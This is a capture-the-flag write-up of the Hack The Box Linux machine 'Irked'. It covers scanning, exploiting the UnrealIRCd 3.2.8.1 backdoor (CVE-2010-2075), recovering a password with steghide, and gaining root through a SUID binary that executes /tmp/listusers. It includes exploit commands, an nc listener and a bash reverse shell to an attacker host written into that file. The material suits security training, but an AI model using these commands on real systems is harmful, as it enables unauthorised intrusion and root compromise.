# Irked — Easy — Linux

**Date:** 31 July 2026

---

## Tags
`#linux` `#irc` `#unrealircd` `#cve-2010-2075` `#backdoor` `#steganography` `#steghide` `#suid` `#relative-path` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | irked.htb (10.129.42.52)                                       |
| OS         | Linux (Debian 8)                                               |
| Open ports | 22, 80, 111, 6697, 8067, 65534, 36367                      |
| Services   | OpenSSH 6.7p1; Apache 2.4.10; UnrealIRCd (IRC); rpcbind        |
| Foothold   | UnrealIRCd 3.2.8.1 backdoor RCE (CVE-2010-2075) → shell as ircd |
| Users      | ircd → djmardov → root                                         |
| Privesc    | steg password (steghide) → djmardov; SUID viewuser runs /tmp/listusers → root |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.42.52

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-01 10:59 +0100
Warning: 10.129.42.52 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.42.52
Host is up (0.017s latency).
Not shown: 65387 closed tcp ports (reset), 141 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
36367/tcp open  unknown
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 29.44 seconds
```

<img width="869" height="432" alt="image" src="https://github.com/user-attachments/assets/ead08c6d-0c84-4d2a-84c9-4afb7f9c0c9f" />

```
nmap -sC -sV -p22,80,111,6697,8067,36367,65534 10.129.42.52

22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
36367/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
```

<img width="1236" height="910" alt="image" src="https://github.com/user-attachments/assets/b158739a-5f61-4871-b705-9939133d0f65" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH 6.7p1 on Debian. Open, but no credentials yet, a target to return to once I find some.
- **Port 80 (HTTP)** — Apache 2.4.10 serving a near-empty page. A good place to start, and (as it turns out) the source of the steg image used later.
- **Ports 111, 36367 (RPC)** — rpcbind / portmapper. Confirms a Unix RPC host; not a promising entry point here.
- **Ports 6697, 8067, 65534 (IRC)** — **UnrealIRCd**. Three IRC listeners are the standout, UnrealIRCd has a well-known backdoored release, so this is the likely foothold.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT:
- Investigate the web app
- Directory-fuzz for hidden paths
- Check the tech stack and page source/JS
```

```
OBSERVATION:
- Port 80 is a single-page site with only the text "IRC is almost working!" and an image
- Nothing turns up in dir fuzzing, the stack, JS, or source
WHAT IT TELLS ME: The web page is a hint pointing at the IRC service; the other ports are my way in
WHAT I AM GOING TO TRY: Research rpcbind 2-4 and UnrealIRCd
WHY: Port 80 is a dead end, so those services are the likely entry point
RESULT:
- rpcbind has some exploits but none useful for a foothold here
- UnrealIRCd 3.2.8.1 shipped with a BACKDOOR (CVE-2010-2075): sending a crafted string beginning
  with "AB" followed by a system command executes it, unauthenticated. (nmap doesn't confirm the
  version, so I'm testing this blind)
- Most references point to a Metasploit module, which I preferred to avoid; I used the manual exploit
  from https://github.com/kevinpdicks/UnrealIRCD-3.2.8.1-RCE, which worked, shell as ircd
- Two users exist; djmardov's home has user.txt, unreadable as ircd
WHAT NEXT: Enumerate to move laterally to djmardov
```

<img width="1502" height="882" alt="image" src="https://github.com/user-attachments/assets/2fdfbcc9-1d80-46eb-8a6d-3bfa738a1d80" />

<img width="1890" height="366" alt="image" src="https://github.com/user-attachments/assets/2f313a53-756d-462f-9ffc-c7ff26f2208d" />

<img width="832" height="583" alt="image" src="https://github.com/user-attachments/assets/f7b6b37b-9029-475c-b706-1764dbe8e51e" />

```
OBSERVATION:
- In /home/djmardov/Documents there's a world-readable .backup file containing a "steg backup" password
WHAT IT TELLS ME: This looks like a steganography passphrase and the obvious carrier is the image
  from the port-80 web page
WHAT I AM GOING TO TRY:
- Download the web image and extract any hidden file using that passphrase
- Also try reusing the password directly as djmardov
WHY: The .backup note explicitly calls it a steg backup password; password reuse is also common
RESULT:
- steghide extracted a hidden pass.txt from the image using the passphrase
- The extracted password worked for djmardov, logged in and read user.txt
WHAT NEXT: Enumerate as djmardov for a privesc path
```

<img width="1225" height="306" alt="image" src="https://github.com/user-attachments/assets/435746af-5dfd-4a6d-99e5-087b66a7c60a" />

<img width="1122" height="864" alt="image" src="https://github.com/user-attachments/assets/4c966ded-c473-4b5d-827d-0e8d405a2ca4" />

<img width="748" height="329" alt="image" src="https://github.com/user-attachments/assets/8761c621-fa46-4d9c-af71-d8450ecca748" />

```
OBSERVATION:
- /usr/bin/viewuser stood out, an uncommon, recently-added SUID binary (a classic HTB privesc tell)
- Running it, it tries to execute /tmp/listusers, which doesn't currently exist
WHAT IT TELLS ME: viewuser is SUID root and calls /tmp/listusers by an absolute path in a
  world-writable directory. If I create /tmp/listusers with my own commands, viewuser will run them
  as root
WHAT I AM GOING TO TRY: Create /tmp/listusers containing a reverse shell (or a shell spawn), make it
  executable, and run viewuser
WHY: A SUID-root binary executing an attacker-controllable file = code execution as root
RESULT:
- Created /tmp/listusers with a reverse shell, chmod +x it (needed, got permission denied without
  the execute bit), started a listener, and ran /usr/bin/viewuser → root shell
- Read root.txt
```

<img width="1223" height="757" alt="image" src="https://github.com/user-attachments/assets/f1bf7568-3c2d-4a20-a3d5-af2735cee566" />

<img width="1323" height="464" alt="image" src="https://github.com/user-attachments/assets/f537ccfc-1d7a-4a9d-9ab8-9809bde65c5d" />

<img width="824" height="341" alt="image" src="https://github.com/user-attachments/assets/756cdfcf-315e-497c-acb4-6863f1767ff9" />
---

## Foothold

**How I got in:** The port-80 page ("IRC is almost working!") pointed at the IRC service, and a full scan showed **UnrealIRCd** on three ports. UnrealIRCd 3.2.8.1 was distributed for a period with a **backdoor** (CVE-2010-2075): any string sent to the server beginning with `AB` followed by a system command is executed on the host, with no authentication. nmap didn't confirm the version, but testing the backdoor blind worked. I used a manual (non-Metasploit) exploit to run a reverse shell and landed as **ircd**.

**Command / exploit used:**
```
echo "10.129.42.52  irked.htb" | sudo tee -a /etc/hosts
git clone https://github.com/kevinpdicks/UnrealIRCD-3.2.8.1-RCE
# edit the payload to a reverse shell, then:
python exploit.py 10.129.42.52 6697
nc -lnvp <LPORT>          # → shell as ircd
```

**Why it worked:** The backdoor is literal malicious code that was inserted into the official UnrealIRCd 3.2.8.1 source, the `AB;<command>` handler runs whatever follows through the system shell. There's no exploitation of a memory bug or auth flaw; the server was simply built to execute attacker commands, so reaching any of its listening ports was enough.

---

## Privilege Escalation

**Path taken (ircd → djmardov → root):**

1. **Lateral move via steganography.** In `/home/djmardov/Documents`, a world-readable `.backup` file held a note about a "steg backup" password. Pairing that passphrase with the image from the port-80 site, `steghide` extracted a hidden `pass.txt`. The recovered password worked for djmardo, SSH/su in and read user.txt.
2. **Root via a SUID binary calling a writable file.** As djmardov I found `/usr/bin/viewuser`, an uncommon SUID-root binary. Running it revealed it tries to execute **`/tmp/listusers`**, which didn't exist. Since `/tmp` is world-writable and viewuser runs as root, I created `/tmp/listusers` with a reverse shell, made it executable, and ran viewuser, root executed my file, returning a root shell.

```
# step 2
cat > /tmp/listusers <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
EOF
chmod +x /tmp/listusers        # required — viewuser needs it executable
/usr/bin/viewuser              # runs /tmp/listusers as root → root shell
```

**Why it worked:** Two failures. First, a secret was hidden by obscurity (steganography) but its passphrase was left world-readable, so "hidden" data was trivially recoverable. Second, and the real root cause: a SUID-root program invoked a helper script (`/tmp/listusers`) from a world-writable location with no integrity check. Anyone who can write that path controls what root executes, a classic SUID-plus-writable-dependency privesc.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Exploited the UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) with a manual `AB;<command>` reverse-shell exploit to get a shell as ircd.
2. **Privesc technique in one sentence:** Recovered a steghide passphrase from a world-readable `.backup`, extracted a hidden password to become djmardov, then abused a SUID-root binary (`viewuser`) that executes a writable `/tmp/listusers` to run my own script as root.
